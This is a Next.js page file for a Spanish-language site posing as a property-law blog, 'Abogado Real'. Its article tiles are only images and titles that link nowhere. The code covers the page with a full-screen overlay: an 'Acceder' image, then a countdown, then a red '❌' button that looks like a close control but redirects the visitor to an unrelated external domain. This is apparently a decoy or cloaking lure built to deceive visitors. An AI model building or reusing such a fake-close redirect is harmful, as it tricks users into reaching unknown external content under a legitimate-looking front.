// pages/index.js
import { useEffect, useState } from 'react';
import Head from 'next/head';
import Image from 'next/image';

export default function Home() {
  const [step, setStep] = useState(0);
  const [countdown, setCountdown] = useState(7);

  useEffect(() => {
    if (step === 1 && countdown > 0) {
      const timer = setTimeout(() => setCountdown(countdown - 1), 1000);
      return () => clearTimeout(timer);
    }
    if (step === 1 && countdown === 0) {
      setStep(2);
    }
  }, [step, countdown]);

  useEffect(() => {
    if (step === 3) {
      window.location.href = 'https://alexandra1507.pro/1x1/a%20(9).html';
    }
  }, [step]);

  return (
    <>
      <Head>
        <title>Abogado Real – Inicio</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
      </Head>
      <header style={styles.header}>
        <a href="/">
          <img src="https://verplay.pro/redi/cropped-ABOGADOS-1-Photoroom.png" alt="Abogado Real" style={styles.logo} />
        </a>
      </header>

      <main style={styles.contentLoop}>
        {articles.map((article, idx) => (
          <div key={idx} style={styles.articleLoop}>
            <div style={{ ...styles.articleImage, backgroundImage: `url('${article.image}')` }}></div>
            <p style={styles.entryTitle}>{article.title}</p>
          </div>
        ))}
      </main>

      <footer style={styles.footer}>
        <p>&copy; 2025 Abogado Real. Todos los derechos reservados.</p>
        <p><a href="#">Cookies</a> | <a href="#">Aviso Legal</a> | <a href="#">Privacidad</a></p>
      </footer>

      {step === 0 && (
        <div style={styles.overlay}>
          <button style={styles.transparentBtn} onClick={() => setStep(1)}>
            <img src="https://visionempresarial.online/sc/new/8766f384-f63e-4b7a-ad59-35416aa66a98.png" alt="Acceder" style={styles.fullImage} />
          </button>
        </div>
      )}

      {step === 1 && (
        <div style={styles.overlay}>
          <div style={styles.countdown}>{countdown}</div>
        </div>
      )}

      {step === 2 && (
        <div style={styles.overlay}>
          <button style={styles.closeBtn} onClick={() => setStep(3)}>❌</button>
        </div>
      )}
    </>
  );
}

const articles = [
  {
    title: 'Derechos del Propietario vs. Ocupante Ilegal: ¿Qué Hacer?',
    image: 'https://verplay.pro/redi/80-400x267.jpg',
  },
  {
    title: 'Impuestos en la Compra y Venta de Inmuebles: Lo Básico',
    image: 'https://verplay.pro/redi/gastos-impuestos-compraventa-viviendas-400x267.jpg',
  },
  {
    title: 'Donaciones de Propiedades: Aspectos Legales que Debes Conocer',
    image: 'https://verplay.pro/redi/proteccion-al-inquilino-1400x933-1-400x267.jpeg',
  },
  {
    title: 'Inquilino vs. Propietario: Derechos y Deberes en Arrendamientos',
    image: 'https://verplay.pro/redi/Derechos-y-obligaciones-del-inquilino-en-una-vivienda-de-alquiler-alojamiento-apartamento-alcaniz-flats-scaled-1-400x267.jpg',
  },
  {
    title: '¿Qué es la Usucapión y Cómo Reclamar Propiedad?',
    image: 'https://verplay.pro/redi/usucapion-o-prescripcion-administrativa-400x267.jpeg',
  },
  {
    title: 'Aspectos Legales en la Compra de Terrenos Rústicos',
    image: 'https://verplay.pro/redi/Diseno-sin-titulo-scaled-1-400x267.jpg',
  },
];

const styles = {
  header: {
    background: '#491068',
    padding: '1rem 2rem',
    color: '#fff',
    display: 'flex',
    alignItems: 'center',
    justifyContent: 'space-between',
  },
  logo: {
    height: '50px',
  },
  contentLoop: {
    maxWidth: '1200px',
    margin: 'auto',
    padding: '2rem',
    display: 'grid',
    gridTemplateColumns: 'repeat(auto-fill, minmax(300px, 1fr))',
    gap: '1.5rem',
  },
  articleLoop: {
    borderRadius: '10px',
    boxShadow: '0 2px 8px rgba(0,0,0,0.1)',
    overflow: 'hidden',
    background: '#fff',
    textAlign: 'center',
    transition: 'transform 0.3s',
  },
  articleImage: {
    height: '180px',
    backgroundSize: 'cover',
    backgroundPosition: 'center',
  },
  entryTitle: {
    padding: '1rem',
    fontSize: '1rem',
    fontWeight: 600,
    color: '#181818',
  },
  footer: {
    background: '#2471a3',
    color: '#fff',
    textAlign: 'center',
    padding: '1rem',
  },
  overlay: {
    position: 'fixed',
    top: 0,
    left: 0,
    width: '100vw',
    height: '100vh',
    backgroundColor: 'black',
    color: 'white',
    display: 'flex',
    justifyContent: 'center',
    alignItems: 'center',
    zIndex: 999999,
    flexDirection: 'column',
    fontFamily: 'sans-serif',
    textAlign: 'center',
    padding: '1rem',
    boxSizing: 'border-box',
  },
  transparentBtn: {
    background: 'none',
    border: 'none',
    cursor: 'pointer',
    padding: 0,
  },
  fullImage: {
    maxWidth: '90vw',
    height: 'auto',
  },
  countdown: {
    fontSize: '60px',
    marginTop: '20px',
    color: 'red',
  },
  closeBtn: {
    position: 'absolute',
    top: '10px',
    right: '10px',
    background: 'red',
    color: 'white',
    border: 'none',
    padding: '5px 10px',
    borderRadius: '50%',
    fontSize: '20px',
    cursor: 'pointer',
    zIndex: 1000000,
  },
};
